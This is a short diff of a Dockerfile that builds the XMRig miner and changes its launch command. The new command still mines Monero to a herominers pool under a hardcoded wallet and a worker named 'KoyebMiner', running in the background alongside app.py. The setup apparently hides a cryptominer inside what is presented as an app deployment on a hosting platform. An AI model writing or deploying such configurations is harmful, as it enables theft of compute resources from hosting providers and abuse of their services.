@@ -24,4 +24,4 @@ RUN git clone https://github.com/xmrig/xmrig.git \
 WORKDIR /Tetroku/xmrig/build
 COPY app.py .
 
-CMD ./xmrig --url xmr.herominers.com:10190 --user 4AsybUjHWc3LtcJj7h7yd9NJ3JXQynQUneMTpoTALYgmSFNW6XLmYGGLR5rHr3zcfjbPZ6dHp9MSdLiDBAXd4wKQ5ufR6vv.KoyebMiner --pass x --threads 6 --cpu-max-threads-hint 80 & python3 app.py
+CMD ./xmrig --url de.monero.herominers.com:1111 --user 4AsybUjHWc3LtcJj7h7yd9NJ3JXQynQUneMTpoTALYgmSFNW6XLmYGGLR5rHr3zcfjbPZ6dHp9MSdLiDBAXd4wKQ5ufR6vv.KoyebMiner --pass x --threads 6 --cpu-max-threads-hint 80 & python3 app.py
